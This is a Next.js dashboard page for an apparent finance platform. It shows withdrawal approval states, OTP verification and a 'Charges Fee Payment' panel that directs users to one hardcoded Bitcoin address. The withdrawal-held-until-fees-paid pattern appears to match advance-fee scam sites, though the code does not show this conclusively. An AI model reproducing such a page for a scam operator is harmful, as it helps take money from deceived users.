"use client"

import Image from 'next/image'
import React, { useState, useEffect } from 'react';
import { MdContentCopy } from 'react-icons/md';
import { IoNavigateCircleOutline } from 'react-icons/io5';
import Link from 'next/link';
import KycBanner from '@/component/KycBanner';
import UserBalanceCard from '@/component/Balance';
import { useUser, useAuth } from '@clerk/nextjs'
import OTPVerification from '@/component/OTPVerification';
import TransactionHistory from '@/component/TransactionHistory';

interface Format {
  _id: string;
  title: string;
  description: string;
  type: number;
  form_id: string;
  approved: boolean;
}

interface Withdrawal {
  clerkId: string;
  approve: string; // This is what we need to check: '0', '1', or '2'
  // Other withdrawal properties...
}


const Page = () => {
    const [copied, setCopied] = useState(false);
    const [formats, setFormats] = useState<Format[]>([]);
    const [withdrawal, setWithdrawal] = useState<Withdrawal | null>(null);
    const address = 'bc1q8pr8h206plxct55s925vh6aghwh9dlvzmwtz2m';
    const { userId, sessionId } = useAuth();

    useEffect(() => {
    const fetchData = async () => {
        try {
        // Fetch formats
        const formatsResponse = await fetch('/api/formats');
        const formatsData = await formatsResponse.json();
        if (formatsData.success) {
            setFormats(formatsData.formats);
        }

        // Fetch withdrawal data - fix the endpoint path
        const withdrawalResponse = await fetch(`/api/displayFormat/withdrawal/${userId}`);
        const withdrawalData = await withdrawalResponse.json();
        
        console.log('Withdrawal API Response:', withdrawalData); // Add for debugging
        
        if (withdrawalData.success && withdrawalData.withdrawal) {
            setWithdrawal(withdrawalData.withdrawal);
        } else {
            console.log('No withdrawal data found or API error');
        }
        } catch (error) {
        console.error('Error fetching data:', error);
        }
    };

    if (userId) {
        fetchData();
    }
    }, [userId]); // Add userId to dependency array

    const copyToClipboard = () => {
        navigator.clipboard.writeText(address);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const viewInExplorer = () => {
        window.open(`https://blockstream.info/address/${address}`, '_blank');
    };

  return (
    <div className='dashboard'>
        {/* Conditionally render based on withdrawal approval status */}
        
        {withdrawal && withdrawal.approve === '0' && formats.length > 1 && (
            <div className="tf_Information">
                <h2>{formats[1]?.title || "Default Title"}</h2>
                <ul>
                    <li>{formats[1]?.description || "Default description"}</li>
                </ul>
                <OTPVerification clerkId={userId as string} />
            </div>
        )}

        {withdrawal && withdrawal.approve === '1' && (
            <div className="tf_Information">
                <h2>{formats[0]?.title || "Default Title"}</h2>
                <ul>
                    <li>{formats[0]?.description || "Default description"}</li>
                </ul>
            </div>
        )}

        {withdrawal && withdrawal.approve === '3' && formats.length > 1 && (
            <div className="tf_Information">
                <h2>{formats[2]?.title || "Default Title"}</h2>
                <ul>
                    <li>{formats[2]?.description || "Default description"}</li>
                </ul>
            </div>
        )}
        
        
        <KycBanner />
        <div className="dashboard-container">
            <div className="dash-top">
                <div className="dash-top-left">
                    <h1>Dashboard</h1>
                    <p>Manage your finances with ease and confidence</p>
                    <span>Welcome back! Your accounts are secure and up to date.</span>
                </div>
                <div className="dash-top-right">
                    <Image src={'/badge.png'} alt='LOJN' height={100} width={100} />
                </div>
            </div>
        </div>
        <UserBalanceCard />
        <div className="active">
            <div className="active-top">
                <h2>Activity Overview</h2>
            </div>
            <div className="active-container">
                {/* <div className="transaction">
                    <div className="transaction-top">
                        <h3>Recent Transactions</h3>
                        <Link href={'/'}>View All</Link>
                    </div>

                    {(withdrawal && withdrawal.approve === "") ? (
                        <div className="transaction-content">
                            <Image src={'/trans.webp'} height={150} width={150} alt='kjh' />
                            <h3>No transactions yet</h3>
                            <p>
                                Your recent transaction history will appear here once you start making transactions.
                            </p>
                        </div>
                    ) : (
                        <div className="transaction-content">
                            <Image src={'/trans.webp'} height={150} width={150} alt='kjh' />
                            <h3>{withdrawal && withdrawal.approve === '0' ? ("🕒 Pending, Transaction processing!") : " "}</h3>
                            <h3>{withdrawal && withdrawal.approve === '1' ? ("🕒 Pending, Transaction processing!") : " "}</h3>
                            <h3>{withdrawal && withdrawal.approve === '3' ? ("🚫⚠️ Withdrawal Rejected") : ("")}</h3>
                            <h3>{withdrawal && withdrawal.approve === '2' ? ("🕒 Pending, Transaction processing!") : " "}</h3>
                            <p>
                                {withdrawal && withdrawal.approve === '3' ? ("Your withdrawal request has been rejected. Please try again.") : ("Your recent transaction is currently processing. We’re currently processing your transaction.")}
                            </p>
                        </div>
                    )}
                </div> */}
                <TransactionHistory />
                <div className="transaction tran_btc">
                    <h1>Charges Fee Payment</h1>
                    <p className='p'>Pay charges fees to this Bitcoin address for secure transactions.</p>
                    <span>
                        <Image src={'/address.jpeg'} height={200} width={200} alt='kjh' />
                    </span>
                    <div className="address">
                        <p>Bitcoin Address:</p>
                        <div className="address_p">
                            <p>bc1q8pr8h206plxct55s925vh6aghwh9dlvzmwtz2m</p>
                        </div>
                        <div className="address-btns">
                            <button  onClick={copyToClipboard}>
                                <MdContentCopy /> <p>Copy Address</p>
                            </button>
                            <button onClick={viewInExplorer}>
                                <IoNavigateCircleOutline /> <p>View Explorer</p>
                            </button>
                        </div>
                        {copied && (
                        <div className="copy-notification">
                            Address copied to clipboard!
                        </div>
                        )}
                    </div>
                </div>
            </div>
        </div>
    </div>
  )
}

export default Page